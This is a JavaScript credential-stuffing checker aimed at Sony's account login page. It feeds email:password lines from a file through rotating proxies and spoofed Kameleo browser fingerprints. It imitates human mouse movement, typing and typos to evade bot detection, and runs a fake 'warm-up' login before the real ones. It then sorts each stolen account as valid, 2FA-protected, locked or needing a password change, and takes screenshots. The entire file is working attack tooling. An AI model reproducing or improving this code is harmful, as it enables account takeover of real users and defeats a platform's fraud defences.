import { KameleoLocalApiClient } from "@kameleo/local-api-client";
import { chromium } from "playwright";
import fs from "node:fs/promises";
import fsSync from "node:fs";
import { fileURLToPath } from 'url';
import { dirname } from 'path';
import { faker } from '@faker-js/faker';
import path from "node:path";
import { logger } from "./utils/logger.js";
import axios from 'axios'


const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

// ==================== Config ====================
const ACCOUNTS_FILE = "accounts.txt";
const WORKING_PROXIES_FILE = "working_proxies.txt";
const COOKIES_FILE = "cookies.json";
const RESULTS_FILE = "results.txt";
const LOGIN_URL = "https://my.account.sony.com/central/management/?entry=device_password&origin_client_id=dfaa38ee-6f41-48c5-908c-2a338a183121";
const KAMELEO_PORT = 5050;
const CONCURRENT_TABS = 2;

const WAIT_FOR_FULL_LOAD = true;
const PAGE_SETTLE_EXTRA_MS = 3000;

const client = new KameleoLocalApiClient({ basePath: `http://localhost:${KAMELEO_PORT}` });

// ==================== Human-like Behavior Functions ====================

// Generate random human-like delay
function randomDelay(min = 100, max = 300) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

// Smooth mouse movement to element
async function smoothMouseMove(page, selector) {
    try {
        const element = await page.locator(selector).first();
        const box = await element.boundingBox();

        if (box) {
            // Random point inside element
            const targetX = box.x + Math.random() * box.width;
            const targetY = box.y + Math.random() * box.height;

            // Smooth mouse movement
            await page.mouse.move(targetX, targetY, { steps: 5 + Math.floor(Math.random() * 5) });
            await sleep(randomDelay(200, 500));
        }
    } catch (err) {
        console.log("Mouse move failed:", err.message);
    }
}

// Hover over element
async function hoverElement(page, selector) {
    try {
        await smoothMouseMove(page, selector);
        await page.hover(selector, { force: true });
        await sleep(randomDelay(150, 350));
    } catch (err) {
        console.log("Hover failed:", err.message);
        // fallback: skip hover if it fails
        await sleep(randomDelay(150, 350));
    }
}

// Enhanced humanClick function
async function humanClick(page, selector, options = {}) {
    try {
        // First wait for element to be visible
        await page.waitForSelector(selector, { state: 'visible', timeout: 10000 });

        await smoothMouseMove(page, selector);
        await sleep(randomDelay(50, 150));

        // Sometimes double click (like human)
        if (Math.random() < 0.1) {
            await page.click(selector, { delay: randomDelay(25, 75), force: true, ...options });
            await sleep(randomDelay(50, 100));
        }

        await page.click(selector, { delay: randomDelay(50, 150), force: true, ...options });
        await sleep(randomDelay(100, 250));
    } catch (err) {
        console.log("Human click failed:", err.message);

        // fallback 1: try with locator and force
        try {
            const locator = page.locator(selector).first();
            await locator.waitFor({ state: 'visible', timeout: 5000 });
            await locator.click({ force: true, ...options });
        } catch (fallbackErr) {
            console.log("Fallback click 1 failed:", fallbackErr.message);

            // fallback 2: try with JavaScript click
            try {
                await page.evaluate((sel) => {
                    const element = document.querySelector(sel);
                    if (element) element.click();
                }, selector);
                console.log("JavaScript click successful");
            } catch (jsErr) {
                console.log("JavaScript click also failed:", jsErr.message);
                throw err;
            }
        }
    }
}

// Human-like character by character typing
async function humanType(page, selector, text, options = {}) {
    try {
        await humanClick(page, selector);

        // Clear field before typing
        await page.fill(selector, '');
        await sleep(randomDelay(100, 200));

        // Type character by character
        for (let i = 0; i < text.length; i++) {
            const char = text[i];
            await page.type(selector, char, { delay: randomDelay(40, 100) });

            // Sometimes pause longer (like thinking)
            if (Math.random() < 0.1) {
                await sleep(randomDelay(150, 400));
            }
        }

        await sleep(randomDelay(150, 300));
    } catch (err) {
        console.log("Human type failed:", err.message);
        // fallback to normal typing
        await page.fill(selector, text);
    }
}

// Simulate typing mistakes and corrections
async function typeWithMistakes(page, selector, correctText) {
    try {
        await humanClick(page, selector);
        await page.fill(selector, '');
        await sleep(randomDelay(200, 400));

        // Sometimes make typing mistakes and correct them
        if (Math.random() < 0.3 && correctText.length > 3) {
            // Type part of the text
            const partialText = correctText.substring(0, Math.floor(correctText.length * 0.7));
            for (let char of partialText) {
                await page.type(selector, char, { delay: randomDelay(80, 200) });
            }

            // Add some extra characters (mistake)
            const mistakes = 'xx';
            for (let char of mistakes) {
                await page.type(selector, char, { delay: randomDelay(80, 200) });
            }

            await sleep(randomDelay(500, 1000));

            // Delete mistakes
            for (let i = 0; i < mistakes.length; i++) {
                await page.press(selector, 'Backspace', { delay: randomDelay(100, 200) });
            }

            await sleep(randomDelay(300, 500));

            // Type remaining text
            const remainingText = correctText.substring(partialText.length);
            for (let char of remainingText) {
                await page.type(selector, char, { delay: randomDelay(80, 200) });
            }
        } else {
            // Normal typing
            for (let char of correctText) {
                await page.type(selector, char, { delay: randomDelay(80, 200) });
            }
        }

        await sleep(randomDelay(300, 600));
    } catch (err) {
        console.log("Type with mistakes failed:", err.message);
        await page.fill(selector, correctText);
    }
}

// Random scrolling (like human checking the page)
async function randomScroll(page) {
    try {
        if (Math.random() < 0.3) {
            const scrollAmount = Math.floor(Math.random() * 150) + 50;
            await page.mouse.wheel(0, scrollAmount);
            await sleep(randomDelay(250, 500));

            // Scroll back to top
            await page.mouse.wheel(0, -scrollAmount);
            await sleep(randomDelay(150, 300));
        }
    } catch (err) {
        console.log("Random scroll failed:", err.message);
    }
}

// Random mouse movements on page
async function randomMouseMovements(page) {
    try {
        if (Math.random() < 0.4) {
            const viewport = await page.viewportSize();
            const x = Math.random() * (viewport?.width || 1200);
            const y = Math.random() * (viewport?.height || 800);

            await page.mouse.move(x, y, { steps: 3 + Math.floor(Math.random() * 5) });
            await sleep(randomDelay(100, 150));
        }
    } catch (err) {
        console.log("Random mouse movement failed:", err.message);
    }
}

// ==================== Enhanced Fake Account Generator with Faker ====================
function generateFakeEmail() {
    // Using faker with correct syntax for new version
    const emailTypes = [
        () => faker.internet.email(),
        () => faker.internet.email({
            firstName: faker.person.firstName(),
            lastName: faker.person.lastName(),
            provider: 'gmail.com'
        }),
        () => faker.internet.email({
            firstName: faker.person.firstName(),
            lastName: faker.person.lastName(),
            provider: 'yahoo.com'
        }),
        () => faker.internet.email({
            firstName: faker.person.firstName(),
            lastName: faker.person.lastName(),
            provider: 'hotmail.com'
        }),
        () => faker.internet.email({
            firstName: faker.person.firstName(),
            lastName: faker.person.lastName(),
            provider: 'outlook.com'
        }),
        () => `${faker.internet.username()}${faker.number.int({ min: 100, max: 9999 })}@gmail.com`,
        () => `${faker.person.firstName().toLowerCase()}${faker.person.lastName().toLowerCase()}${faker.number.int({ min: 10, max: 99 })}@gmail.com`
    ];

    const randomType = emailTypes[Math.floor(Math.random() * emailTypes.length)];
    return randomType().toLowerCase();
}

function generateFakePassword() {
    // Using faker with correct syntax for new version
    const passwordTypes = [
        () => faker.internet.password({ length: 12, memorable: false, pattern: /[A-Za-z0-9!@#$%^&*]/ }),
        () => faker.internet.password({ length: 10, memorable: false }),
        () => `${faker.person.firstName()}${faker.number.int({ min: 1000, max: 9999 })}!`,
        () => `${faker.internet.username()}${faker.number.int({ min: 100, max: 999 })}@`,
        () => `${faker.lorem.word()}${faker.number.int({ min: 10, max: 99 })}#${faker.string.alphanumeric(3)}`,
        () => {
            // More complex password
            const parts = [
                faker.person.firstName(),
                faker.number.int({ min: 1000, max: 9999 }),
                faker.helpers.arrayElement(['!', '@', '#', '$', '%', '^', '&', '*'])
            ];
            return parts.join('');
        }
    ];

    const randomType = passwordTypes[Math.floor(Math.random() * passwordTypes.length)];
    return randomType();
}

function generateFakeAccountLine() {
    const email = faker.internet.email();
    const password = faker.internet.password();
    return `${email.toLocaleLowerCase()}:${password}`;
}

// ==================== Helpers ====================
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

function resolvePwBridgePath() {
    if (process.env.PW_BRIDGE_PATH) return process.env.PW_BRIDGE_PATH;
    if (process.platform === "win32") return `${process.env.LOCALAPPDATA}\\Programs\\Kameleo\\pw-bridge.exe`;
    if (process.platform === "darwin") return "/Applications/Kameleo.app/Contents/Resources/CLI/pw-bridge";
    return "/opt/kameleo/pw-bridge";
}

// ==================== Working Proxy Management ====================

// Load working proxies from the pre-tested file
async function loadWorkingProxies() {
    try {
        if (!fsSync.existsSync(WORKING_PROXIES_FILE)) {
            console.log("❌ No working_proxies.txt file found!");
            console.log("🔧 Please run: node proxy-tester.js proxies.txt");
            return [];
        }

        const content = await fs.readFile(WORKING_PROXIES_FILE, "utf8");
        const proxies = content
            .split("\n")
            .map(line => line.trim())
            .filter(Boolean)
            .map(line => {
                const parts = line.split(":");
                if (parts.length >= 2) {
                    return {
                        host: parts[0],
                        port: parseInt(parts[1]),
                        username: parts[2] || null,
                        password: parts[3] || null,
                        originalLine: line
                    };
                }
                return null;
            })
            .filter(Boolean);

        console.log(`✅ Loaded ${proxies.length} pre-tested working proxies`);
        return proxies;
    } catch (err) {
        console.log("❌ Error loading working proxies:", err.message);
        return [];
    }
}

// Get next working proxy from the list
async function getNextWorkingProxy(workingProxies) {
    if (!workingProxies || workingProxies.length === 0) {
        console.log("❌ No more working proxies available");
        return null;
    }

    // Take the first proxy (they are already sorted by speed)
    const selectedProxy = workingProxies.shift();
    console.log(`🎯 Selected proxy: ${selectedProxy.host}:${selectedProxy.port} (pre-tested)`);
    return selectedProxy;
}

// Remove used proxy from working proxies file
async function removeUsedWorkingProxy(usedProxy) {
    try {
        if (!usedProxy || !usedProxy.originalLine) {
            console.log("No proxy to remove or missing original line");
            return;
        }

        if (!fsSync.existsSync(WORKING_PROXIES_FILE)) {
            console.log("Working proxies file not found");
            return;
        }

        const content = await fs.readFile(WORKING_PROXIES_FILE, "utf8");
        const lines = content
            .split("\n")
            .map(line => line.trim())
            .filter(Boolean);

        const remainingLines = lines.filter(line => line !== usedProxy.originalLine);

        if (remainingLines.length < lines.length) {
            if (remainingLines.length > 0) {
                await fs.writeFile(WORKING_PROXIES_FILE, remainingLines.join("\n") + "\n", "utf8");
            } else {
                await fs.writeFile(WORKING_PROXIES_FILE, "", "utf8");
            }

            console.log(`🗑️ Removed used proxy: ${usedProxy.host}:${usedProxy.port}`);
            console.log(`📊 Remaining working proxies: ${remainingLines.length}`);
        } else {
            console.log("⚠️ Proxy not found in working proxies file");
        }

    } catch (err) {
        console.log("Error removing used working proxy:", err.message);
    }
}

// Load cookies from file
async function loadCookies() {
    try {
        if (!fsSync.existsSync(COOKIES_FILE)) {
            console.log("No cookies file found. Running without cookies.");
            return [];
        }

        const content = await fs.readFile(COOKIES_FILE, "utf8");
        const cookies = JSON.parse(content);
        console.log(`Loaded ${cookies.length} cookies`);
        return cookies;
    } catch (err) {
        console.log("Error loading cookies:", err.message);
        return [];
    }
}

// ==================== Enhanced: Duplicate profile and update proxy ====================
async function createNewProfile(proxy = null, cookies = [], retryCount = 0) {
    const maxRetries = 3;

    try {
        console.log("Creating new profile...");

        const fingerprints = await client.fingerprint.searchFingerprints("desktop", "windows", "chrome", "139");
        const fingerprint = fingerprints.filter(item => item.os.version === '10').sort(() => Math.random() - 0.5)[0]

        const profileName = `Profile_${Date.now()}_${Math.random().toString(36).substr(2, 5)}`;

        const createProfileRequest = {
            fingerprintId: fingerprint.id,
            name: profileName,
            webRtc: { value: "block" },
            // screen: { value: "off" },
            screen: { value: 'manual', extra: '1280x720' },
            fonts: 'off'
        };

        // Add proxy if exists
        if (proxy) {
            createProfileRequest.proxy = {
                value: 'http',
                extra: {
                    host: proxy.host,
                    port: proxy.port
                }
            };

            if (proxy.username && proxy.password) {
                createProfileRequest.proxy.extra.id = proxy.username;
                createProfileRequest.proxy.extra.secret = proxy.password;
            }

            console.log(`Setting proxy: ${proxy.host}:${proxy.port}`);
        }

        const profile = await client.profile.createProfile(createProfileRequest);

        // Connect with increased timeout
        const ws = `ws://localhost:${KAMELEO_PORT}/playwright/${profile.id}`;
        const pwBridgePath = resolvePwBridgePath();

        console.log("Connecting to profile with Playwright...");

        const context = await chromium.launchPersistentContext("", {
            executablePath: pwBridgePath,
            args: ['--window-size=1920,1080', `-target ${ws}`], // اختیاری برای کنترل اندازه پنجره
            viewport: { width: 1920, height: 1080 },
            timeout: 25000, // Increased from 25000 to 45000
            headless: true,
            // Add additional options for stability
            chromiumSandbox: false,
            devtools: false
        });

        // Test connection with a simple page
        console.log("Testing profile connection...");
        const testPage = await context.newPage();
        await testPage.goto('about:blank', { timeout: 10000 });
        await testPage.close();

        console.log("✅ Profile created and tested successfully");

        return {
            profile: {
                id: profile.id,
                name: profileName
            },
            context,
            proxy: proxy
        };

    } catch (err) {
        console.error("Error creating profile:", err.message);

        // Clean up failed profile
        try {
            if (err.profile?.id) {
                await client.profile.deleteProfile(err.profile.id);
            }
        } catch (cleanupErr) {
            console.log("Cleanup error:", cleanupErr.message);
        }

        // Handle specific timeout errors
        if (err.message.includes('Timeout') && err.message.includes('exceeded')) {
            console.log(`❌ Profile creation timeout occurred`);

            if (retryCount < maxRetries) {
                console.log(`🔄 Retrying profile creation (${retryCount + 1}/${maxRetries})...`);
                await sleep(2500 * (retryCount + 1)); // Progressive delay
                return createNewProfile(proxy, cookies, retryCount + 1);
            }
        }

        // Handle proxy issues
        if (proxy && (err.message.includes('Failed to determine external IP address') ||
            err.message.includes('HTTP 503') ||
            err.message.includes('connection'))) {

            console.log(`❌ Proxy failed: ${proxy.host}:${proxy.port}`);
            await removeUsedWorkingProxy(proxy);

            if (retryCount < maxRetries) {
                console.log(`🔄 Retrying with new proxy (${retryCount + 1}/${maxRetries})...`);
                await sleep(1500);
                const workingProxies = await loadWorkingProxies();
                const selectedProxy = await getNextWorkingProxy(workingProxies);
                return createNewProfile(selectedProxy, cookies, retryCount + 1);
            }
        }

        throw err;
    }
}

// Wait for complete load + 3 seconds pause
async function waitFullLoadAndSettle(page) {
    if (WAIT_FOR_FULL_LOAD) {
        try { await page.waitForLoadState("load", { timeout: 15000 }); } catch { }
    }
    await sleep(PAGE_SETTLE_EXTRA_MS);

    // Human-like behaviors after page load
    await randomMouseMovements(page);
    await randomScroll(page);
}

// Find frame that contains the selector
async function waitForFrameWithSelector(page, selector, timeout = 20000) {
    const start = Date.now();
    let lastError = null;

    while (Date.now() - start < timeout) {
        try {
            for (const frame of page.frames()) {
                try {
                    const el = await frame.$(selector);
                    if (el) {
                        console.log(`✅ Found selector "${selector}" in frame`);
                        return frame;
                    }
                } catch (frameErr) {
                    lastError = frameErr;
                }
            }
        } catch (pageErr) {
            lastError = pageErr;
        }

        await sleep(100);
    }

    console.log(`❌ Frame with selector "${selector}" not found after ${timeout}ms`);
    if (lastError) {
        console.log("Last error:", lastError.message);
    }

    throw new Error(`Frame with selector "${selector}" not found`);
}

// Enhanced emailLocator with fallback selectors
function emailLocator(frame) {
    const selectors = [
        'input[type="email"]:visible',
        'input[type="email"]',
        '#signin-entrance-input-signinId',
        'input[autocomplete*="email"]',
        'input[autocomplete*="username"]',
        '[data-qa*="email"]'
    ];

    for (const selector of selectors) {
        try {
            const locator = frame.locator(selector).first();
            console.log(`📧 Using email selector: ${selector}`);
            return locator;
        } catch (err) {
            continue;
        }
    }

    // If none worked, return default
    console.log("📧 Using default email selector");
    return frame.locator('input[type="email"]').first();
}

// Click that may cause navigation with human behavior
async function safeClickMayNavigate(page, frame, selector, navTimeout = 8000) {
    // Human-like behavior before click
    await hoverElement(page, selector);

    const nav = page.waitForNavigation({ waitUntil: "load", timeout: navTimeout }).catch(() => null);
    const click = humanClick(page, selector);
    await Promise.all([click, nav]);
    await waitFullLoadAndSettle(page);
}

// ==================== Updated Copy-Paste Functions with Human Behavior ====================
async function humanPasteEmail(page, locator, fullAccountLine) {
    await locator.waitFor({ state: "visible" });

    // Human-like behavior: hover and click
    const selector = await locator.first().getAttribute('name') || 'input[type="email"]';
    await hoverElement(page, `input[type="email"]`);
    await humanClick(page, `input[type="email"]`);

    console.log("📋 Pasting full account line into email field...");

    // Paste entire account line with delay
    await locator.fill('');
    await sleep(randomDelay(150, 3000));
    await locator.fill(fullAccountLine);
    await sleep(randomDelay(400, 600)); // Pause for display

    // Find position of last colon
    const lastColonIndex = fullAccountLine.lastIndexOf(':');
    if (lastColonIndex === -1) {
        throw new Error("Invalid account format - no colon found");
    }

    // Extract password for returning
    const password = fullAccountLine.substring(lastColonIndex + 1);

    console.log("✂️ Step 1: Cutting password part from email field...");

    // Move to end of text
    await locator.press('End', { delay: randomDelay(50, 100) });

    // Select only password part (without colon)
    const passwordLength = password.length;
    for (let i = 0; i < passwordLength; i++) {
        await locator.press('Shift+ArrowLeft', { delay: randomDelay(25, 50) });
    }

    await sleep(randomDelay(150, 250));

    // Cut password part
    await locator.press('Control+x', { delay: randomDelay(100, 150) });

    console.log(`✂️ Password "${password}" cut from email field`);

    // Human-like delay
    await sleep(randomDelay(400, 600));

    console.log("🗑️ Step 2: Deleting colon (:) from email field...");

    // Now delete the colon
    await locator.press('Backspace', { delay: randomDelay(150, 250) });

    await sleep(randomDelay(300, 500));

    console.log("✅ Email field cleaned - only email remains");

    return password;
}

async function humanPastePassword(page, locator, password) {
    await locator.waitFor({ state: "visible" });

    // Human-like behavior: hover and click
    await hoverElement(page, `input[type="password"]`);
    await humanClick(page, `input[type="password"]`);

    console.log(`📋 Pasting password: ${password}`);

    // Paste password with delay
    await locator.fill('');
    await sleep(randomDelay(100, 200));
    await locator.fill(password);
    await sleep(randomDelay(250, 400));

    console.log("✅ Password pasted successfully");
}

// Enhanced selector for password field
function passwordLocator(frame) {
    // Try multiple different selectors
    const selectors = [
        'input[type="password"]:visible:not([aria-hidden="true"])',
        'input[type="password"]:not([tabindex="-1"])',
        'input[type="password"]',
        '#signin-entrance-input-password',
        '[data-qa*="password"]'
    ];

    for (const selector of selectors) {
        try {
            const locator = frame.locator(selector).first();
            return locator;
        } catch (err) {
            continue;
        }
    }

    // If none worked, return default
    return frame.locator('input[type="password"]').first();
}

// Enhanced processFakeAccountFirst with better timeout handling and retries
async function processFakeAccountFirst(context) {
    console.log("🎭 Processing fake account first to warm up the profile...");

    const fakeAccountLine = generateFakeAccountLine();
    console.log(`🎭 Using faker-generated fake account: ${fakeAccountLine}`);

    let page = null;
    const maxRetries = 3;
    let retryCount = 0;

    while (retryCount < maxRetries) {
        try {
            page = await context.newPage();

            // Set longer timeout and try different wait strategies
            console.log(`🎭 Attempt ${retryCount + 1}/${maxRetries}: Loading page...`);

            try {
                // First attempt with networkidle
                await page.goto(LOGIN_URL, {
                    waitUntil: "networkidle",
                    timeout: 30000
                });
                console.log("✅ Page loaded with networkidle");
                break; // Success, exit retry loop

            } catch (networkIdleErr) {
                console.log("⚠️ NetworkIdle failed, trying with domcontentloaded...");

                try {
                    await page.goto(LOGIN_URL, {
                        waitUntil: "domcontentloaded",
                        timeout: 20000
                    });
                    console.log("✅ Page loaded with domcontentloaded");
                    break; // Success, exit retry loop

                } catch (domErr) {
                    console.log("⚠️ DOMContentLoaded failed, trying basic load...");

                    await page.goto(LOGIN_URL, {
                        waitUntil: "load",
                        timeout: 25000
                    });
                    console.log("✅ Page loaded with basic load");
                    break; // Success, exit retry loop
                }
            }

        } catch (gotoErr) {
            retryCount++;
            console.log(`🎭 Attempt ${retryCount}/${maxRetries} failed:`, gotoErr.message);

            // Close failed page
            try {
                if (page) await page.close();
                page = null;
            } catch { }

            // Check for critical proxy/connection errors
            if (gotoErr.message.includes('net::ERR_EMPTY_RESPONSE') ||
                gotoErr.message.includes('net::ERR_CONNECTION_REFUSED') ||
                gotoErr.message.includes('net::ERR_PROXY_CONNECTION_FAILED') ||
                gotoErr.message.includes('net::ERR_TUNNEL_CONNECTION_FAILED') ||
                gotoErr.message.includes('Timeout') && retryCount >= maxRetries) {

                console.log("❌ Critical connection error detected");
                throw new Error('PROXY_CONNECTION_FAILED');
            }

            // Wait before retry
            if (retryCount < maxRetries) {
                const waitTime = 1500 * retryCount; // Increasing delay
                console.log(`⏳ Waiting ${waitTime}ms before retry...`);
                await sleep(waitTime);
            } else {
                throw gotoErr;
            }
        }
    }

    // Continue with the rest of the fake account processing
    await waitFullLoadAndSettle(page);

    // Human-like behavior: looking at page
    await sleep(randomDelay(1000, 2000));
    await randomMouseMovements(page);

    const submitSelector = "button[type=submit]";

    // Email step with copy-paste
    console.log("🎭 Processing fake email with copy-paste method...");

    let emailFrame;
    try {
        emailFrame = await waitForFrameWithSelector(page, 'input[type="email"]', 15000); // Increased timeout
    } catch (frameErr) {
        console.log("🎭 Email frame not found:", frameErr.message);

        // Check for execution context errors
        if (frameErr.message.includes('Execution context was destroyed') ||
            frameErr.message.includes('Frame with selector') ||
            frameErr.message.includes('navigation')) {
            throw new Error('CONTEXT_DESTROYED');
        }

        throw frameErr;
    }

    const emailInput = emailLocator(emailFrame);
    const cutPassword = await humanPasteEmail(page, emailInput, fakeAccountLine);

    await safeClickMayNavigate(page, emailFrame, submitSelector);

    // Password step with paste
    console.log("🎭 Pasting fake password...");
    const passFrame = await waitForFrameWithSelector(page, 'input[type="password"]', 7500);
    const passInput = passwordLocator(passFrame);

    await humanPastePassword(page, passInput, cutPassword);
    await safeClickMayNavigate(page, passFrame, submitSelector);

    // Wait and check results (we expect this to fail, which is fine)
    await sleep(randomDelay(2000, 3000));
    const bodyText = await page.evaluate(() => document.body?.innerText || "");

    if (bodyText.includes(`Can't connect to the server`)) {
        throw new Error('SERVER_CONNECTION_FAILED');
    }

    console.log("🎭 Fake account process completed (expected to fail)");

    // Save used fake faker account
    const fakeAccountLogLine = `${fakeAccountLine}\n`;
    await fs.appendFile('./fake_accounts_used.txt', fakeAccountLogLine, "utf8");

    try {
        if (page) await page.close();
    } catch { }

    console.log("🎭 Fake account warming completed. Now starting real accounts...");
}

// ==================== Updated processAccountInTab - مشابه کد قدیمی ====================
async function processAccountInTab(context, accountLine, tabIndex) {
    let page = null;
    const maxRetries = 2;
    const startTime = Date.now();

    try {
        logger.info(`🚀 Tab ${tabIndex + 1}: Starting login for ${accountLine}`);
        const email = accountLine.split(':')[0];

        for (let attempt = 1; attempt <= maxRetries; attempt++) {
            try {
                // کمی تاخیر تصادفی برای جلوگیری از تداخل
                await sleep(randomDelay(50, 250));
                page = await context.newPage();

                // تنظیم viewport منحصر به فرد برای هر تب
                await page.setViewportSize({
                    width: 1200 + (tabIndex * 50),
                    height: 800 + (tabIndex * 30)
                });

                logger.info(`📄 Tab ${tabIndex + 1}: Loading page (attempt ${attempt}/${maxRetries})...`);

                // Try different loading strategies (مثل کد قدیمی)
                try {
                    await page.goto(LOGIN_URL, {
                        waitUntil: "networkidle",
                        timeout: 15000
                    });
                } catch (networkErr) {
                    logger.info(`Tab ${tabIndex + 1}: NetworkIdle failed, trying domcontentloaded...`);
                    await page.goto(LOGIN_URL, {
                        waitUntil: "domcontentloaded",
                        timeout: 12000
                    });
                }

                break; // Success, exit retry loop

            } catch (gotoErr) {
                logger.error(`Tab ${tabIndex + 1}: Page load attempt ${attempt} failed: ${gotoErr.message}`);

                // Close failed page
                try {
                    if (page) await page.close();
                    page = null;
                } catch { }

                if (attempt >= maxRetries) {
                    logger.error(`Tab ${tabIndex + 1}: All page load attempts failed for ${email}`);
                    return {
                        email,
                        status: 'server-error',
                        responseTime: Date.now() - startTime,
                        tabIndex
                    };
                }

                // Wait before retry with progressive delay
                await sleep(2000 * attempt + randomDelay(250, 750));
            }
        }

        await waitFullLoadAndSettle(page);

        // Human-like behavior با تاخیر متفاوت برای هر تب (مثل کد قدیمی)
        await randomMouseMovements(page);
        await sleep(randomDelay(750, 1500) + (tabIndex * 300));

        const submitSelector = "button[type=submit]";

        // Email with copy-paste method (مثل کد قدیمی)
        logger.info(`📧 Tab ${tabIndex + 1}: Processing email with copy-paste method for ${email}`);
        const emailFrame = await waitForFrameWithSelector(page, 'input[type="email"]', 20000);
        const emailInput = emailLocator(emailFrame);

        const cutPassword = await humanPasteEmail(page, emailInput, accountLine);
        await safeClickMayNavigate(page, emailFrame, submitSelector);

        // Password with paste (مثل کد قدیمی)
        const passFrame = await waitForFrameWithSelector(page, 'input[type="password"]', 10000);
        const passInput = passwordLocator(passFrame);

        logger.info(`🔑 Tab ${tabIndex + 1}: Pasting password for ${email}`);

        // Check for passkey (مثل کد قدیمی)
        await sleep(randomDelay(1000, 1500) + (tabIndex * 200));
        let bodyText = await page.evaluate(() => document.body?.innerText || "");

        if (bodyText.includes(`Sign In with Passkey`)) {
            logger.info(`🔐 Tab ${tabIndex + 1}: Passkey detected for ${email}`);
            return {
                email,
                status: 'passkey',
                responseTime: Date.now() - startTime,
                tabIndex
            };
        }

        await humanPastePassword(page, passInput, cutPassword);
        await safeClickMayNavigate(page, passFrame, submitSelector);

        // Wait and check results (مثل کد قدیمی)
        await sleep(3000 + randomDelay(500, 1500));
        bodyText = await page.evaluate(() => document.body?.innerText || "");

        if (!bodyText) {
            await sleep(2000 + randomDelay(1000, 2000));
            bodyText = await page.evaluate(() => document.body?.innerText || "");
        }

        // if (bodyText.includes('Something went wrong') || bodyText.includes(`Can't connect to the server`)) {
        //     const retryResult = await retryLoginAfterError(page, accountLine, email, tabIndex, submitSelector, startTime);

        //     if (retryResult.shouldExit) {
        //         // تب بسته شده، خروج از تابع
        //         return retryResult.result;
        //     }

        //     // ادامه با bodyText جدید
        //     bodyText = retryResult.bodyText;
        // }

        // ادامه کد فقط اگر bodyText موجود باشه...
        await waitFullLoadAndSettle(page);

        // Human-like behavior: looking at page
        await sleep(randomDelay(1000, 2000));

        // گرفتن اسکرین‌شات با نام منحصر به فرد
        const screenshotPath = await takeAdvancedScreenshot(page, `${email}---tab${tabIndex}---${Date.now()}.png`);

        let status = 'unknown';

        // Status checking logic (دقیقاً مثل کد قدیمی)
        if (bodyText.includes(`A verification code has been sent to your email address`)) {
            logger.info(`✅ Tab ${tabIndex + 1}: Good account - ${email}`);
            status = 'good';
        }
        else if (bodyText.includes(`2-step verification is enabled. Open your authenticator app and get the verification code. Enter that code here.`)) {
            logger.info(`🔐 Tab ${tabIndex + 1}: 2FA account - ${email}`);
            status = '2fa';
        }
        else if (bodyText.includes(`Your account has been locked. To sign in, you'll need to recover your account.`)) {
            logger.info(`🔒 Tab ${tabIndex + 1}: Guard account - ${email}`);
            status = 'guard';
        }
        else if (bodyText.includes(`The sign-in ID (email address) or password you entered isn't correct, or you might need to reset your password for security reasons.`)) {
            logger.info(`🔄 Tab ${tabIndex + 1}: Change pass account - ${email}`);
            status = 'change-pass'; // تغییر به فرمت جدید
        }
        else if (bodyText.includes(`2-step verification is enabled. Check your mobile phone for a text message with a verification code`)) {
            logger.info(`📱 Tab ${tabIndex + 1}: 2step mobile account - ${email}`);
            status = 'mobile-2step'; // تغییر به فرمت جدید
        }
        else if (bodyText.includes(`Can't connect to the server`)) {
            logger.info(`🌐 Tab ${tabIndex + 1}: Server connection error for ${email}`);
            status = 'server-error'; // تغییر به فرمت جدید
        }
        else {
            logger.info(`❓ Tab ${tabIndex + 1}: Unknown result for ${email}`);
            status = 'unknown';
        }

        const responseTime = Date.now() - startTime;
        logger.info(`⏱️ Tab ${tabIndex + 1}: Processing completed in ${responseTime}ms`);

        return {
            email,
            status,
            responseTime,
            tabIndex,
            screenshot: screenshotPath,
            additionalInfo: {
                bodyTextLength: bodyText.length,
                processingTime: responseTime
            }
        };

    } catch (err) {
        logger.error(`❌ Tab ${tabIndex + 1}: Error processing ${accountLine}: ${err.message}`);
        return {
            email: accountLine.split(':')[0],
            status: 'server-error',
            error: err.message,
            responseTime: Date.now() - startTime,
            tabIndex
        };
    } finally {
        try {
            if (page) {
                logger.info(`🧹 Tab ${tabIndex + 1}: Closing page...`);
                await page.close();
            }
        } catch (closeErr) {
            logger.error(`Tab ${tabIndex + 1}: Page close error: ${closeErr.message}`);
        }
    }
}

// تابع جداگانه برای retry logic با خروج در صورت عدم پاسخ
async function retryLoginAfterError(page, accountLine, email, tabIndex, submitSelector, startTime) {
    logger.info(`🔄 Tab ${tabIndex + 1}: Starting retry process for ${email}`);

    try {
        // رفرش صفحه
        await page.reload({
            waitUntil: 'domcontentloaded'
        });

        await waitFullLoadAndSettle(page);
        await sleep(randomDelay(2000, 4000));
        await randomMouseMovements(page);

        const submitSelector = "button[type=submit]";

        // Email with copy-paste method (مثل کد قدیمی)
        logger.info(`📧 Tab ${tabIndex + 1}: Retry Processing email with copy-paste method for ${email}`);
        const emailFrame = await waitForFrameWithSelector(page, 'input[type="email"]', 20000);
        const emailInput = emailLocator(emailFrame);

        const cutPassword = await humanPasteEmail(page, emailInput, accountLine);
        await safeClickMayNavigate(page, emailFrame, submitSelector);

        // Password with paste (مثل کد قدیمی)
        const passFrame = await waitForFrameWithSelector(page, 'input[type="password"]', 20000);
        const passInput = passwordLocator(passFrame);

        logger.info(`🔑 Tab ${tabIndex + 1}: Pasting password for ${email}`);

        // Check for passkey (مثل کد قدیمی)
        await sleep(randomDelay(2000, 3000) + (tabIndex * 200));
        await humanPastePassword(page, passInput, cutPassword);
        await safeClickMayNavigate(page, passFrame, submitSelector);

        // Wait and check results (مثل کد قدیمی)
        await sleep(12000 + randomDelay(1000, 3000));
        bodyText = await page.evaluate(() => document.body?.innerText || "");

        if (!bodyText) {
            await sleep(8000 + randomDelay(2000, 4000));
            bodyText = await page.evaluate(() => document.body?.innerText || "");
        }

        // اگر هنوز bodyText نداریم، خروج
        if (!bodyText) {
            logger.error(`❌ Tab ${tabIndex + 1}: No response after retry, force closing tab for ${email}`);

            await page.close();

            return {
                shouldExit: true,
                result: {
                    email,
                    status: 'server-error',
                    responseTime: Date.now() - startTime,
                    tabIndex,
                    error: 'No response after refresh and retry'
                }
            };
        }

        logger.info(`✅ Tab ${tabIndex + 1}: Retry completed successfully for ${email}`);
        return {
            shouldExit: false,
            bodyText: bodyText
        };

    } catch (retryErr) {
        logger.error(`❌ Tab ${tabIndex + 1}: Retry failed for ${email}: ${retryErr.message}`);

        await page.close();

        return {
            shouldExit: true,
            result: {
                email,
                status: 'server-error',
                responseTime: Date.now() - startTime,
                tabIndex,
                error: retryErr.message
            }
        };
    }
}

